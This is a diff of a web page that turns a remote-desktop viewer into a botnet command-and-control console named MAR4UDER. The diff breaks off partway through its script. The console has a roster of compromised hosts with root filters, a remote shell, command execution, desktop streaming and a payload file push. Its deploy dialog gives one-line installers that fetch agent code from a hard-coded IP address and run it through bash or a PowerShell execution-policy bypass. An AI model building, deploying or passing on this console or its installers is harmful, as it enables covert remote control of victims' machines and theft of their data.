@@ -1,1000 +1,1000 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>DEDSEC // {{NODE_ID}} [SLOT #{{SLOT}}]</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MAR4UDER // C2 CYBERNET CONSOLE</title>
 <script type="module" src="/video-stream.js"></script>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-
   :root {
-    --bg: #000000;
-    --border: #222222;
-    --border-bright: #444444;
-    --border-white: #ffffff;
-    --text: #ffffff;
-    --text-muted: #888888;
-    --text-dim: #444444;
+    --bg-base: #06090e;
+    --bg-panel: #0b1017;
+    --bg-card: #101722;
+    --bg-card-active: #152234;
+    --border: #1a2636;
+    --border-glow: #00e5ff33;
+    --cyan: #00e5ff;
+    --green: #00ff88;
+    --magenta: #ff0055;
+    --amber: #ffb800;
+    --text-main: #d8e4f0;
+    --text-muted: #627894;
+    --font-mono: 'JetBrains Mono', 'Fira Code', Consolas, 'Courier New', monospace;
   }
 
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', Consolas, monospace;
-    overflow: hidden;
+    background: var(--bg-base);
+    color: var(--text-main);
+    font-family: var(--font-mono);
     height: 100vh;
     display: flex;
     flex-direction: column;
-    letter-spacing: -0.2px;
+    overflow: hidden;
     user-select: none;
+    letter-spacing: -0.2px;
   }
 
-  /* TOP DEDSEC COMMAND BAR */
+  /* CANVAS BACKGROUND */
+  #bg-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.18;
+  }
+
+  /* SCANLINES EFFECT */
+  .scanlines {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.35) 50%);
+    background-size: 100% 3px;
+    pointer-events: none;
+    z-index: 999;
+    opacity: 0.65;
+  }
+
+  /* TOP HEADER HUD */
   header {
-    background: #080808;
+    background: rgba(11, 16, 23, 0.92);
     border-bottom: 1px solid var(--border);
-    padding: 4px 10px;
+    backdrop-filter: blur(8px);
+    padding: 6px 14px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    min-height: 42px;
-    z-index: 50;
-    gap: 8px;
-    flex-wrap: wrap;
+    min-height: 48px;
+    z-index: 100;
+    gap: 12px;
   }
 
-  .pod {
+  .brand-group {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .brand-logo {
+    font-weight: 900;
+    font-size: 14px;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 0 0 10px var(--cyan);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .brand-tag {
+    font-size: 9px;
+    padding: 2px 6px;
+    border: 1px solid var(--cyan);
+    color: var(--cyan);
+    border-radius: 2px;
+    background: rgba(0, 229, 255, 0.08);
+  }
+
+  .telemetry-bar {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    font-size: 11px;
+    color: var(--text-muted);
+  }
+
+  .t-item {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .t-val {
+    color: #fff;
+    font-weight: 700;
+  }
+
+  .t-green { color: var(--green); }
+  .t-cyan { color: var(--cyan); }
+  .t-amber { color: var(--amber); }
+  .t-magenta { color: var(--magenta); }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* BUTTONS */
+  .btn {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    color: var(--text-main);
+    padding: 5px 10px;
+    font-size: 11px;
+    font-family: inherit;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: all 0.15s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .btn:hover {
+    border-color: var(--cyan);
+    color: #fff;
+    box-shadow: 0 0 8px rgba(0, 229, 255, 0.25);
+  }
+  .btn-cyan {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    background: rgba(0, 229, 255, 0.06);
+  }
+  .btn-cyan:hover {
+    background: var(--cyan);
+    color: #000;
+  }
+  .btn-magenta {
+    border-color: var(--magenta);
+    color: var(--magenta);
+  }
+  .btn-magenta:hover {
+    background: var(--magenta);
+    color: #fff;
+  }
+
+  /* LAYOUT */
+  #main-layout {
+    flex: 1;
+    display: flex;
+    overflow: hidden;
+    position: relative;
+    z-index: 10;
+  }
+
+  /* SIDEBAR: NODE ROSTER */
+  #sidebar {
+    width: 320px;
+    background: rgba(11, 16, 23, 0.85);
+    border-right: 1px solid var(--border);
+    backdrop-filter: blur(6px);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  .roster-header {
+    padding: 10px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .search-box {
+    display: flex;
+    align-items: center;
+    background: var(--bg-base);
+    border: 1px solid var(--border);
+    padding: 4px 8px;
+    border-radius: 2px;
+  }
+  .search-box input {
+    background: transparent;
+    border: none;
+    color: #fff;
+    font-family: inherit;
+    font-size: 11px;
+    width: 100%;
+    outline: none;
+  }
+
+  .roster-filters {
+    display: flex;
+    gap: 4px;
+  }
+  .filter-btn {
+    flex: 1;
+    padding: 3px 6px;
+    font-size: 9px;
+    font-family: inherit;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    cursor: pointer;
+    text-align: center;
+  }
+  .filter-btn.active {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    background: rgba(0, 229, 255, 0.08);
+  }
+
+  .node-list {
+    flex: 1;
+    overflow-y: auto;
+    padding: 6px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  /* NODE CARD */
+  .node-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 8px 10px;
+    border-radius: 2px;
+    cursor: pointer;
+    transition: all 0.12s ease;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+  .node-card:hover {
+    border-color: rgba(0, 229, 255, 0.5);
+    background: rgba(21, 34, 52, 0.6);
+  }
+  .node-card.active {
+    border-color: var(--cyan);
+    background: var(--bg-card-active);
+    box-shadow: inset 2px 0 0 var(--cyan);
+  }
+
+  .card-top {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .card-id-group {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .card-slot {
+    font-size: 10px;
+    color: var(--cyan);
+    font-weight: 700;
+  }
+  .card-name {
+    font-size: 12px;
+    font-weight: 700;
+    color: #fff;
+  }
+  .status-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--text-muted);
+  }
+  .status-dot.online {
+    background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+  }
+  .status-dot.stale {
+    background: var(--amber);
+  }
+
+  .card-mid {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 10px;
+    color: var(--text-muted);
+  }
+  .badge-root {
+    color: var(--magenta);
+    font-weight: 700;
+  }
+  .badge-user {
+    color: var(--green);
+  }
+
+  /* WORKSPACE */
+  #workspace {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    background: rgba(6, 9, 14, 0.7);
+  }
+
+  /* TOP WORKSPACE NAV TABS */
+  .tab-bar {
+    background: var(--bg-panel);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 10px;
+  }
+
+  .tabs-group {
+    display: flex;
+    align-items: center;
+  }
+
+  .tab-btn {
+    padding: 10px 14px;
+    font-size: 11px;
+    font-family: inherit;
+    font-weight: 700;
+    color: var(--text-muted);
+    background: transparent;
+    border: none;
+    border-bottom: 2px solid transparent;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    transition: all 0.12s ease;
+  }
+  .tab-btn:hover {
+    color: #fff;
+  }
+  .tab-btn.active {
+    color: var(--cyan);
+    border-bottom-color: var(--cyan);
+    background: rgba(0, 229, 255, 0.04);
+  }
+
+  .tab-content {
+    flex: 1;
+    display: none;
+    flex-direction: column;
+    overflow: hidden;
+    position: relative;
+  }
+  .tab-content.active {
+    display: flex;
+  }
+
+  /* TAB: TERMINAL */
+  #term-container {
+    flex: 1;
+    background: #040608;
+    padding: 10px;
+    overflow-y: auto;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    line-height: 1.4;
+    white-space: pre-wrap;
+    word-break: break-all;
+    outline: none;
+  }
+
+  .term-toolbar {
+    background: var(--bg-panel);
+    border-top: 1px solid var(--border);
+    padding: 6px 10px;
     display: flex;
     align-items: center;
     gap: 6px;
     flex-wrap: wrap;
   }
 
-  .brand {
-    font-weight: 800;
-    font-size: 12px;
-    letter-spacing: 2px;
-    color: #ffffff;
-  }
-
-  .tag {
-    font-size: 10px;
-    color: var(--text-muted);
-    border: 1px solid var(--border);
-    padding: 2px 6px;
-    background: #000000;
-  }
-
-  .status-box {
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    font-size: 10px;
-    font-weight: 700;
-    padding: 2px 7px;
-    border: 1px solid var(--border-bright);
-    background: #000000;
-    color: var(--text-muted);
-  }
-  .status-box.online {
-    border-color: #ffffff;
-    color: #ffffff;
-    background: #151515;
-  }
-  .s-dot {
-    width: 6px;
-    height: 6px;
-    background: #ffffff;
-    border-radius: 50%;
-  }
-
-  select {
-    background: #000000;
-    border: 1px solid var(--border-bright);
-    color: var(--text);
-    padding: 2px 5px;
-    font-size: 10px;
-    font-family: inherit;
-    outline: none;
-    cursor: pointer;
-  }
-  select:focus, select:hover {
-    border-color: var(--border-white);
-  }
-
-  button {
-    background: #000000;
-    border: 1px solid var(--border-bright);
-    color: #ffffff;
-    padding: 3px 8px;
-    font-size: 10px;
-    font-family: inherit;
-    font-weight: 700;
-    cursor: pointer;
-    text-transform: uppercase;
-    transition: all 0.12s ease;
-    display: inline-flex;
-    align-items: center;
-    gap: 4px;
-    white-space: nowrap;
-  }
-  button:hover {
-    background: #ffffff;
-    color: #000000;
-    border-color: #ffffff;
-  }
-
-  button.active-toggle {
-    background: #ffffff !important;
-    color: #000000 !important;
-    border-color: #ffffff !important;
-  }
-
-  /* MODIFIERS & SPECIAL KEYS TOOLBAR */
-  #keys-bar {
-    background: #040404;
-    border-bottom: 1px solid var(--border);
-    padding: 3px 10px;
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    overflow-x: auto;
-    z-index: 45;
-  }
-  .k-label {
-    font-size: 9px;
-    color: var(--text-dim);
-    letter-spacing: 1px;
-    margin-right: 4px;
-    white-space: nowrap;
-  }
-  .key-btn {
-    padding: 2px 6px;
-    font-size: 10px;
-    background: #0c0c0c;
-    border: 1px solid #333333;
-    color: #cccccc;
-    min-width: 32px;
-    justify-content: center;
-  }
-  .key-btn:hover {
-    background: #ffffff;
-    color: #000000;
-    border-color: #ffffff;
-  }
-  .key-btn.locked {
-    background: #ffffff;
-    color: #000000;
-    border-color: #ffffff;
-    box-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
-  }
-
-  /* VIEWPORT */
-  #viewport {
+  /* TAB: DESKTOP STREAM */
+  #stream-viewport {
     flex: 1;
-    position: relative;
-    background: #000000;
+    background: #000;
     display: flex;
     align-items: center;
     justify-content: center;
-    outline: none;
+    position: relative;
     overflow: hidden;
-    cursor: crosshair;
   }
-
   video-stream {
     width: 100%;
     height: 100%;
     display: flex;
     align-items: center;
     justify-content: center;
-    position: relative;
-    z-index: 10;
   }
   video-stream video {
-    width: 100%;
-    height: 100%;
     max-width: 100%;
     max-height: 100%;
     object-fit: contain;
-    pointer-events: none;
   }
 
-  /* FULLSCREEN ASCII RADAR */
-  #ascii-radar-container {
-    position: absolute;
-    inset: 0;
-    width: 100%;
-    height: 100%;
+  /* TAB: RPC RUNNER */
+  .rpc-panel {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 12px;
+    gap: 10px;
+  }
+  .rpc-input-group {
+    display: flex;
+    gap: 8px;
+  }
+  .rpc-input {
+    flex: 1;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    color: #fff;
+    padding: 8px 12px;
+    font-family: inherit;
+    font-size: 12px;
+    border-radius: 2px;
+    outline: none;
+  }
+  .rpc-input:focus {
+    border-color: var(--cyan);
+  }
+  .rpc-output {
+    flex: 1;
+    background: #040608;
+    border: 1px solid var(--border);
+    padding: 12px;
+    color: var(--green);
+    font-family: inherit;
+    font-size: 11px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    border-radius: 2px;
+  }
+
+  /* TAB: FILES */
+  .file-manager {
+    flex: 1;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    padding: 12px;
+    overflow: hidden;
+  }
+  .file-col {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    padding: 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .file-list {
+    flex: 1;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+  .file-item {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 6px 10px;
     display: flex;
     align-items: center;
-    justify-content: center;
-    z-index: 5;
-    background: #000000;
-    pointer-events: none;
-    overflow: hidden;
-    transition: opacity 0.4s ease;
-  }
-  #ascii-radar-container.active-video {
-    opacity: 0;
-    pointer-events: none;
-  }
-  #ascii-radar-container.forced-hud {
-    opacity: 0.88 !important;
-    pointer-events: none;
-    z-index: 25 !important;
-    mix-blend-mode: screen;
-  }
-
-  #ascii-radar-pre {
-    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', Consolas, monospace;
+    justify-content: space-between;
     font-size: 11px;
-    line-height: 11px;
-    color: #ffffff;
-    text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
-    white-space: pre;
-    text-align: center;
-    user-select: none;
-    margin: 0;
-    padding: 0;
   }
 
-  /* TOAST */
-  #notification-toast {
-    position: absolute;
-    top: 14px;
-    right: 14px;
-    background: #000000;
-    border: 1px solid #ffffff;
-    color: #ffffff;
-    padding: 5px 12px;
-    font-size: 11px;
-    font-weight: 700;
-    z-index: 100;
-    display: none;
-    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.9);
-  }
-
-  /* SETTINGS MODAL */
-  #settings-modal {
-    display: none;
+  /* MODALS */
+  .modal-overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0, 0, 0, 0.88);
-    z-index: 200;
+    background: rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(4px);
+    z-index: 1000;
+    display: none;
     align-items: center;
     justify-content: center;
   }
-  .modal-card {
-    border: 1px solid #444444;
-    background: #080808;
-    padding: 24px;
-    width: min(440px, 92vw);
-    box-shadow: 0 16px 40px rgba(0,0,0,0.95);
-    font-family: inherit;
+  .modal-overlay.open {
+    display: flex;
+  }
+  .modal-box {
+    background: var(--bg-panel);
+    border: 1px solid var(--cyan);
+    box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
+    width: 500px;
+    max-width: 90vw;
+    padding: 16px;
+    border-radius: 2px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+  .modal-head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 8px;
+    font-weight: 700;
+    color: var(--cyan);
+  }
+  .code-snippet {
+    background: #040608;
+    border: 1px solid var(--border);
+    padding: 8px 10px;
+    color: var(--green);
+    font-size: 11px;
+    user-select: all;
+    word-break: break-all;
   }
 </style>
 </head>
 <body>
 
+<canvas id="bg-canvas"></canvas>
+<div class="scanlines" id="scanlines-el"></div>
+
+<!-- HEADER HUD -->
 <header>
-  <!-- LEFT: System Info -->
-  <div class="pod">
-    <span class="brand">// DEDSEC //</span>
-    <span class="tag">>_ {{NODE_ID}} [SLOT #{{SLOT}}]</span>
-    <div class="status-box" id="status-box">
-      <div class="s-dot"></div>
-      <span id="codec-badge">[LINK SEARCH]</span>
-    </div>
+  <div class="brand-group">
+    <div class="brand-logo">⚡ MAR4UDER // C2</div>
+    <div class="brand-tag">DEDSEC CYBERNET</div>
   </div>
 
-  <!-- CENTER: Quality & Transport -->
-  <div class="pod">
-    <select id="sel-scale" title="Масштаб">
-      <option value="1.0" selected>100%</option>
-      <option value="0.75">75%</option>
-      <option value="0.5">50%</option>
-      <option value="0.35">35%</option>
-    </select>
-    <select id="sel-fps" title="FPS">
-      <option value="30" selected>30 FPS</option>
-      <option value="20">20 FPS</option>
-      <option value="15">15 FPS</option>
-    </select>
-    <select id="sel-bitrate" title="Битрейт">
-      <option value="3000">3000k</option>
-      <option value="2000" selected>2000k</option>
-      <option value="1000">1000k</option>
-      <option value="500">500k</option>
-    </select>
-    <select id="sel-preset" style="display:none"><option value="0" selected>0</option></select>
-    <select id="sel-mode" title="Транспорт" onchange="changeMode(this.value)">
-      <option value="webrtc" selected>WebRTC</option>
-      <option value="mse">MSE</option>
-    </select>
-    <button onclick="applyQualitySettings()">[APPLY]</button>
-
-    <!-- Input Interceptor -->
-    <button id="btn-toggle-input" class="active-toggle" onclick="toggleInputCapture()" title="Хоткей: PageDown">
-      [● INPUT: ON] PgDn
-    </button>
-
-    <button onclick="document.getElementById('file-upload-input').click()">[+ FILE]</button>
-    <input type="file" id="file-upload-input" style="display:none" onchange="uploadFiles(this.files)" multiple>
-    <button onclick="toggleFullscreen()">[FULL]</button>
-    <button onclick="reconnect()">[RELOAD]</button>
-    <button id="btn-radar-toggle" onclick="toggleRadarMode()">[RADAR]</button>
-    <button onclick="openSettings()">[SETTINGS]</button>
+  <div class="telemetry-bar">
+    <div class="t-item">NODES: <span class="t-val t-green" id="h-online-count">0</span>/<span class="t-val" id="h-total-count">0</span></div>
+    <div class="t-item">UPTIME: <span class="t-val t-cyan" id="h-uptime">0s</span></div>
+    <div class="t-item">TRAFFIC: <span class="t-val t-amber" id="h-traffic">TX 0 KB / RX 0 KB</span></div>
   </div>
 
-  <!-- RIGHT: Telemetry -->
-  <div class="pod">
-    <span class="tag" id="res-val">RES: -</span>
-    <span class="tag" id="tele-sig">SIG: [||||||||]</span>
-    <span class="tag" id="dedsec-clock">00:00:00</span>
+  <div class="header-actions">
+    <button class="btn btn-cyan" onclick="openDeployModal()">+ QUICK DEPLOY</button>
+    <button class="btn" onclick="updateAllNodes()">🚀 UPDATE ALL</button>
+    <button class="btn" onclick="toggleScanlines()">CRT SCAN</button>
+    <button class="btn" onclick="toggleAudio()" id="audio-toggle-btn">🔊 AUDIO</button>
+    <button class="btn" onclick="refreshData()">⟳</button>
   </div>
 </header>
 
-<!-- QUICK KEYS STRIP -->
-<div id="keys-bar">
-  <span class="k-label">[KEYS]</span>
-  <button class="key-btn" id="k-ctrl" onclick="toggleModifier('Control')">CTRL</button>
-  <button class="key-btn" id="k-alt" onclick="toggleModifier('Alt')">ALT</button>
-  <button class="key-btn" id="k-shift" onclick="toggleModifier('Shift')">SHIFT</button>
-  <button class="key-btn" id="k-super" onclick="toggleModifier('Meta')">WIN</button>
-  <span style="color:#333;">|</span>
-  <button class="key-btn" onclick="sendSingleKey('Escape', 'Escape')">ESC</button>
-  <button class="key-btn" onclick="sendSingleKey('Tab', 'Tab')">TAB</button>
-  <button class="key-btn" onclick="sendSingleKey('Backspace', 'Backspace')">BKSP</button>
-  <button class="key-btn" onclick="sendSingleKey('Delete', 'Delete')">DEL</button>
-  <button class="key-btn" onclick="sendSingleKey('Enter', 'Enter')">ENTER</button>
-  <span style="color:#333;">|</span>
-  <button class="key-btn" onclick="sendKeyCombo(['Control', 'c'])">CTRL+C</button>
-  <button class="key-btn" onclick="sendKeyCombo(['Control', 'v'])">CTRL+V</button>
-  <button class="key-btn" onclick="sendKeyCombo(['Control', 'z'])">CTRL+Z</button>
-  <button class="key-btn" onclick="sendKeyCombo(['Alt', 'Tab'])">ALT+TAB</button>
-  <button class="key-btn" onclick="sendKeyCombo(['Alt', 'F4'])">ALT+F4</button>
-  <button class="key-btn" onclick="sendKeyCombo(['Control', 'Alt', 'Delete'])">CTRL+ALT+DEL</button>
-  <span style="color:#333;">|</span>
-  <button class="key-btn" onclick="sendSingleKey('F1', 'F1')">F1</button>
-  <button class="key-btn" onclick="sendSingleKey('F2', 'F2')">F2</button>
-  <button class="key-btn" onclick="sendSingleKey('F5', 'F5')">F5</button>
-  <button class="key-btn" onclick="sendSingleKey('F11', 'F11')">F11</button>
-  <button class="key-btn" onclick="sendSingleKey('F12', 'F12')">F12</button>
-</div>
+<!-- MAIN WORKSPACE -->
+<div id="main-layout">
+  
+  <!-- SIDEBAR ROSTER -->
+  <div id="sidebar">
+    <div class="roster-header">
+      <div class="search-box">
+        <input type="text" id="search-input" placeholder="🔍 Search host, ID, IP..." oninput="filterNodes()">
+      </div>
+      <div class="roster-filters">
+        <button class="filter-btn active" onclick="setFilter('all')">ALL</button>
+        <button class="filter-btn" onclick="setFilter('online')">ONLINE</button>
+        <button class="filter-btn" onclick="setFilter('root')">ROOT</button>
+      </div>
+    </div>
+    <div class="node-list" id="node-list-container">
+      <!-- Populated via JS -->
+    </div>
+  </div>
 
-<div id="viewport" tabindex="0">
-  <div id="notification-toast"></div>
+  <!-- WORKSPACE TABS -->
+  <div id="workspace">
+    <div class="tab-bar">
+      <div class="tabs-group">
+        <button class="tab-btn active" onclick="switchTab('tab-term')">💻 PTY TERMINAL</button>
+        <button class="tab-btn" onclick="switchTab('tab-rpc')">⚡ FAST EXEC</button>
+        <button class="tab-btn" onclick="switchTab('tab-stream')">🛰️ DESKTOP STREAM</button>
+        <button class="tab-btn" onclick="switchTab('tab-files')">📁 FILE MANAGER</button>
+        <button class="tab-btn" onclick="switchTab('tab-ops')">⚙️ NODE OPS</button>
+      </div>
+      <div id="active-target-info" style="font-size: 11px; color: var(--cyan); font-weight: 700;">NO TARGET SELECTED</div>
+    </div>
 
-  <!-- FULLSCREEN ASCII RADAR -->
-  <div id="ascii-radar-container">
-    <pre id="ascii-radar-pre"></pre>
+    <!-- TAB 1: PTY TERMINAL -->
+    <div class="tab-content active" id="tab-term">
+      <div id="term-container" tabindex="0">Connecting to terminal...</div>
+      <div class="term-toolbar">
+        <button class="btn" onclick="sendTerminalKey('id\n')">id</button>
+        <button class="btn" onclick="sendTerminalKey('uname -a\n')">uname</button>
+        <button class="btn" onclick="sendTerminalKey('ps aux | head -20\n')">ps</button>
+        <button class="btn" onclick="sendTerminalKey('ss -tulnp || netstat -tulnp\n')">ports</button>
+        <button class="btn" onclick="sendTerminalKey('df -h\n')">df</button>
+        <button class="btn" onclick="sendTerminalKey('\x03')">Ctrl+C</button>
+        <button class="btn" onclick="clearTerminal()">Clear</button>
+      </div>
+    </div>
+
+    <!-- TAB 2: FAST RPC -->
+    <div class="tab-content" id="tab-rpc">
+      <div class="rpc-panel">
+        <div class="rpc-input-group">
+          <input type="text" class="rpc-input" id="rpc-cmd" placeholder="Enter remote command (e.g. cat /etc/os-release)..." onkeydown="if(event.key==='Enter') executeRPC()">
+          <button class="btn btn-cyan" onclick="executeRPC()">EXECUTE</button>
+        </div>
+        <div class="rpc-output" id="rpc-output">// Command output will appear here...</div>
+      </div>
+    </div>
+
+    <!-- TAB 3: DESKTOP STREAM -->
+    <div class="tab-content" id="tab-stream">
+      <div id="stream-viewport">
+        <div id="stream-placeholder" style="color: var(--text-muted); font-size: 12px;">Select an online node to view desktop stream</div>
+      </div>
+    </div>
+
+    <!-- TAB 4: FILES -->
+    <div class="tab-content" id="tab-files">
+      <div class="file-manager">
+        <div class="file-col">
+          <div style="font-weight: 700; color: var(--cyan);">PUSH FILE TO TARGET</div>
+          <input type="text" class="rpc-input" id="file-dest-path" placeholder="/tmp/payload.bin" value="/tmp/agent_data">
+          <input type="file" id="file-upload-input">
+          <button class="btn btn-cyan" onclick="pushFileToNode()">UPLOAD & PUSH TO NODE</button>
+          <div id="file-upload-status" style="font-size: 11px; color: var(--green);"></div>
+        </div>
+        <div class="file-col">
+          <div style="font-weight: 700; color: var(--cyan);">SERVER REPOSITORY</div>
+          <div class="file-list" id="server-files-list">Loading files...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 5: NODE OPS -->
+    <div class="tab-content" id="tab-ops">
+      <div class="rpc-panel">
+        <div style="font-weight: 700; color: var(--cyan);">LIFECYCLE & MAINTENANCE</div>
+        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+          <button class="btn btn-cyan" onclick="pingTarget()">📡 PING NODE</button>
+          <button class="btn" onclick="updateTarget()">🔄 UPDATE AGENT BINARY</button>
+          <button class="btn btn-magenta" onclick="uninstallTarget()">☠️ UNINSTALL AGENT</button>
+        </div>
+        <div class="rpc-output" id="ops-output">// Operation telemetry output...</div>
+      </div>
+    </div>
+
   </div>
 </div>
 
-<!-- SETTINGS & ADMIN PASSWORD MODAL -->
-<div id="settings-modal">
-  <div class="modal-card">
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; border-bottom:1px solid #222; padding-bottom:8px;">
-      <span style="font-weight:800; font-size:12px; letter-spacing:1px;">// DEDSEC SECURITY SETTINGS //</span>
-      <button onclick="closeSettings()" style="padding:2px 6px; font-size:10px;">[X]</button>
+<!-- DEPLOY MODAL -->
+<div class="modal-overlay" id="deploy-modal">
+  <div class="modal-box">
+    <div class="modal-head">
+      <div>QUICK ONE-LINE INSTALLERS</div>
+      <button class="btn" onclick="closeDeployModal()">✕</button>
     </div>
-    <div style="font-size:11px; color:#888; margin-bottom:14px;">TARGET: {{NODE_ID}} [SLOT #{{SLOT}}]</div>
-    <div style="margin-bottom:16px;">
-      <label style="font-size:10px; color:#aaa; display:block; margin-bottom:6px;">UPDATE ADMIN PASSWORD (NC / VNC / WEB):</label>
-      <input type="password" id="new-admin-pass" placeholder="ENTER NEW PASSWORD" style="width:100%; background:#000; border:1px solid #444; color:#fff; padding:7px 10px; font-family:inherit; font-size:11px; outline:none;" />
-    </div>
-    <div style="display:flex; gap:8px;">
-      <button onclick="saveAdminPassword()" style="flex:1; background:#fff; color:#000; justify-content:center; padding:7px;">[ SAVE PASSWORD ]</button>
-      <button onclick="closeSettings()" style="justify-content:center; padding:7px;">[ CANCEL ]</button>
-    </div>
+    <div style="font-size: 11px; color: var(--text-muted);">Linux Target Agent (Curl):</div>
+    <div class="code-snippet" id="snip-agent">curl -s http://104.143.206.163:8080/i | bash</div>
+    <div style="font-size: 11px; color: var(--text-muted);">Operator Admin CLI (m4r):</div>
+    <div class="code-snippet" id="snip-m4r">curl -s http://104.143.206.163:8080/m4r | bash</div>
+    <div style="font-size: 11px; color: var(--text-muted);">Windows Powershell Agent:</div>
+    <div class="code-snippet" id="snip-win">powershell -ep bypass -c "iwr -useb http://104.143.206.163:8080/m4r.ps1 | iex"</div>
   </div>
 </div>
 
-<script type="module">
-  const viewport = document.getElementById('viewport');
-  const codecBadge = document.getElementById('codec-badge');
-  const statusBox = document.getElementById('status-box');
-  const resVal = document.getElementById('res-val');
-  const teleSig = document.getElementById('tele-sig');
-  const clockEl = document.getElementById('dedsec-clock');
-  const toast = document.getElementById('notification-toast');
-  const radarContainer = document.getElementById('ascii-radar-container');
-  const radarPre = document.getElementById('ascii-radar-pre');
+<script>
+  let nodes = [];
+  let selectedNode = null;
+  let activeFilter = 'all';
+  let termWS = null;
+  let audioEnabled = false;
+  let audioCtx = null;
 
-  const slotNum = "{{SLOT}}";
-  const streamSrc = (slotNum && !slotNum.startsWith("{{")) ? `desktop_slot_${slotNum}` : "desktop";
-  let isNodeOnline = ("{{IS_ONLINE}}" === "true");
-
-  let inputEnabled = true;
-  let forceRadar = false;
-  let currentVideoStream = null;
-  let inputWS = null;
-  let activeMode = 'webrtc';
-  let connectStartTs = Date.now();
-
-  let connStep = isNodeOnline ? 2 : 1;
-  let logLines = [
-    `[SYS] SESSION INIT // TARGET {{NODE_ID}} [SLOT #${slotNum}]`,
-    isNodeOnline ? `[SYS] CARRIER ACTIVE ON UDP:443` : `[WARN] CARRIER OFFLINE // AWAITING PING`
-  ];
-
-  function addLog(tag, msg) {
-    const d = new Date();
-    const t = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
-    logLines.push(`[${t}] [${tag}] ${msg}`);
-    if (logLines.length > 5) logLines.shift();
-  }
-
-  // 1. FULLSCREEN THICK ASCII RADAR
-  let radarFrame = 0;
-  const chars = ' .:-=+*#%@';
-
-  function renderAsciiRadar() {
-    radarFrame += 0.045;
-    const charW = 7.0;
-    const charH = 11.0;
-    const w = Math.max(60, Math.floor(window.innerWidth / charW));
-    const h = Math.max(24, Math.floor((window.innerHeight - 80) / charH));
-    
-    const cx = w / 2.0;
-    const cy = h / 2.0;
-
-    const s1 = (connStep >= 1) ? '[1.AGENT:OK]' : '[1.AGENT:..]';
-    const s2 = (connStep >= 2) ? '[2.GATEWAY:OK]' : '[2.GATEWAY:..]';
-    const s3 = (connStep >= 3) ? '[3.SDP:OK]' : '[3.SDP:..]';
-    const s4 = (connStep >= 4) ? '[4.ICE:OK]' : '[4.ICE:..]';
-    const s5 = (connStep >= 5) ? '[5.STREAM:OK]' : '[5.STREAM:..]';
-    const stepperLine = `${s1} == ${s2} == ${s3} == ${s4} == ${s5}`;
-
-    const elapsed = ((Date.now() - connectStartTs) / 1000).toFixed(1);
-
-    const hud = [
